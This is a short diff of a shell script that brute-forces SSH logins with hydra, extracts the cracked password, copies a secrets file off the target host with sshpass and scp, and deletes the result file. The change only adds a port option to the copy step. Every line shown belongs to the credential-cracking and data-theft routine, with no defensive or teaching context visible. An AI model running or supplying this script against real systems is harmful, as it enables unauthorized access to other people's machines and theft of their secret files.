@@ -14,7 +14,7 @@ hydra -l $username -P passwd.txt $host ssh -o result.txt
 password=$(grep 'login:password' result.txt | awk '{print $3}')
 
 # Use the extracted password to log in to the target host and retrieve the secrets file
-sshpass -p "${password}" scp "${username}@${host}:${secrets_file_path}" "${local_path}"
+sshpass -p "${password}" scp -P "${port}" "${username}@${host}:${secrets_file_path}" "${local_path}"
 
 # Clean up the result file
 rm result.txt
